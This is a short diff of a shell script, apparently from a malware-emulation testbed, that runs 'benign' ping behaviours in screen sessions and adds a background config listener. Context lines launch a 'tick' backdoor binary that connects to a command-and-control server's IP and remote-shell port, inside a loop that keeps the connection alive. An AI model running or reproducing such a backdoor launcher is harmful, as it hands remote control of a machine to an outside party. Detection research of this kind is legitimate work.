@@ -54,10 +54,11 @@ if [ "$benign_process_active" = true ]; then
 	screen -dmS ping_bb bash $benign_behaviors_folder/ping_behavior.sh 	
 fi
 
+# start listening for config changes
+python listen_for_config_change.py &
 
 # start listening for C&C server
 screen -S tick $tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell
-	
 
 # renew connection to prevent crashes
 while true; do
